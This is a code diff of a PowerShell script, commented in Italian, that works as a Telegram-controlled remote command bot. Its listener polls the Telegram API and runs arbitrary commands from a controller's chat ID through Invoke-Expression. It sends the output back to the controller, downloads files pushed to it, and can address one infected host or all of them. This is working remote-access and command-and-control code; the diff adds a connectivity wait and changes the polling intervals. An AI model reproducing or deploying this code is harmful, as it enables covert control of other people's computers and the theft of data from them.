@@ -163,111 +163,113 @@ function CheckRequiredParameters($CommandString)
 
 function CommandListener
 {
-    $offset = 0
-    $hostia = $env:COMPUTERNAME
-    $hostname = $hostia
-    $wait = 1000
+    $offset     = 0
+    $hostia     = $env:COMPUTERNAME
+    $hostname   = $hostia
+    $wait       = 500
 
-    try {
-        Log "Invio un avviso al controller che il bot è stato avviato con successo"
-        SendMessage "Computer online!"
-    } catch {
-        Exit-PSSession
+    Log "Attendo la connessione a Telegram..."
+    while (!(Test-NetConnection -ComputerName "api.telegram.org" -Port 443)) {
+        Start-Sleep -Seconds 5
     }
 
+    Log "Invio un avviso al controller che il bot è stato avviato con successo"
+    SendMessage "Computer online!"
+
+    Log "Attendo istruzioni da parte del Controller..."
     while ($true) {        
         try {
             $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
             if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
-                    if ($offset -eq 0) {
-                        $offset = $message.result.Count
-                        Start-Sleep -Seconds 1
-                        continue
-                    }
+                if ($offset -eq 0) {
+                    $offset = $message.result.Count
+                    Start-Sleep -Seconds 1
+                    continue
+                }
 
-                    $offset     = $message.result.Count
-                    $message    = $message.result.Message[-1]
-                    $user_id    = $message.chat.id
-                    $uname      = $message.chat.username
-                    $text       = $message.text
-                    $document   = $message.document
-        
-                    if ($hostname -match $hostia) {
-                        if ($user_id -match $telegram_id) {
-                            # Gestione comandi personalizzati
-                            if ($text.Length -gt 0) {
-                                $check_command = $text.Split()
-                                if ($check_command[0] -match "set") {
-                                    # Se il comando è SET ALL imposta tutti gli host connessi a ricevere ed eseguire i comandi
-                                    if ($check_command[1] -match "all") {
-                                        $hostname = $hostia
+                $offset     = $message.result.Count
+                $message    = $message.result.Message[-1]
+                $user_id    = $message.chat.id
+                $uname      = $message.chat.username
+                $text       = $message.text
+                $document   = $message.document
+    
+                if ($hostname -match $hostia) {
+                    if ($user_id -match $telegram_id) {
+                        # Gestione comandi personalizzati
+                        if ($text.Length -gt 0) {
+                            $check_command = $text.Split()
+                            if ($check_command[0] -match "set") {
+                                # Se il comando è SET ALL imposta tutti gli host connessi a ricevere ed eseguire i comandi
+                                if ($check_command[1] -match "all") {
+                                    $hostname = $hostia
+                                    SendMessage "Computer pronto a ricevere istruzioni"
+                                } else {
+                                    # Se il comando è SET <hostname> imposta solo lui a rispondere ai comandi
+                                    $hostname = $check_command[1]
+                                    if ($env:COMPUTERNAME -match $hostname) {
                                         SendMessage "Computer pronto a ricevere istruzioni"
-                                    } else {
-                                        # Se il comando è SET <hostname> imposta solo lui a rispondere ai comandi
-                                        $hostname = $check_command[1]
-                                        if ($env:COMPUTERNAME -match $hostname) {
-                                            SendMessage "Computer pronto a ricevere istruzioni"
-                                        }
-                                    }
-                                    continue
-                                }
-                                
-                                # Se il comando è ONLINE richiedi agli host se sono operativi e pronti
-                                if ($check_command[0] -match "online") {
-                                    SendMessage "Questo computer è operativo"
-                                    continue
-                                }
-
-                                # Se il comando è WHOIS richiedi agli host chi sta ricevendo i comandi
-                                if ($check_command[0] -match "whois") {
-                                    if ($hostname -match $hostia) {
-                                        SendMessage "Io sono operativo!"
-                                        continue
                                     }
                                 }
-                                
-                                # Esecuzione del comando
-                                try {
-                                    if (CheckRequiredParameters $text) {
-                                        $output = Invoke-Expression -Command $text | Out-String
-                                    } else {
-                                        continue
-                                    }
-                                } catch {
-                                    $output = $Error[0] | Out-String
-                                }
-        
-                                $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
-                                    $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
-                                }                        
-        
-                                foreach ($block in $output_splitted) {
-                                    $block = $block | Out-String
-                                    SendMessage $block
-                                }
-
-                                if ($output_splitted.Count -eq 0) {
-                                    Start-Sleep -Milliseconds 300
-                                    SendMessage "Comando eseguito"
-                                }
-
+                                continue
+                            }
+                            
+                            # Se il comando è ONLINE richiedi agli host se sono operativi e pronti
+                            if ($check_command[0] -match "online") {
+                                SendMessage "Questo computer è operativo"
+                                continue
                             }
 
-                            # Se il messaggio contiene un file
-                            if ($document) {
-                                $file_id   = $document.file_id
-                                $file_name = $document.file_name
-                                DownloadFile $file_id $file_name
+                            # Se il comando è WHOIS richiedi agli host chi sta ricevendo i comandi
+                            if ($check_command[0] -match "whois") {
+                                if ($hostname -match $hostia) {
+                                    SendMessage "Io sono operativo!"
+                                    continue
+                                }
                             }
-                        } else {
-                            $unauth_user_found = ("L'utente [" + $user_id + "] @" + $uname + " ha provato ad utilizzare il bot eseguendo questa azione: [" + $text + "]")
-                            SendMessage $unauth_user_found
+                            
+                            # Esecuzione del comando
+                            try {
+                                if (CheckRequiredParameters $text) {
+                                    $output = Invoke-Expression -Command $text | Out-String
+                                } else {
+                                    continue
+                                }
+                            } catch {
+                                $output = $Error[0] | Out-String
+                            }
+    
+                            $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 4096) {
+                                $output.Substring($i, [Math]::Min(4096, $output.Length - $i))
+                            }                        
+    
+                            foreach ($block in $output_splitted) {
+                                $block = $block | Out-String
+                                SendMessage $block
+                            }
+
+                            if ($output_splitted.Count -eq 0) {
+                                Start-Sleep -Milliseconds 300
+                                SendMessage "Comando eseguito"
+                            }
+
                         }
+
+                        # Se il messaggio contiene un file
+                        if ($document) {
+                            $file_id   = $document.file_id
+                            $file_name = $document.file_name
+                            DownloadFile $file_id $file_name
+                        }
+                    } else {
+                        $unauth_user_found = ("L'utente [" + $user_id + "] @" + $uname + " ha provato ad utilizzare il bot eseguendo questa azione: [" + $text + "]")
+                        SendMessage $unauth_user_found
                     }
-                    $wait = 500
+                }
+                $wait = 500
             }
 
-            if ($wait -eq 5000) {
+            if ($wait -eq 3000) {
                 $wait = 1000
             } else {
                 $wait = $wait + 100
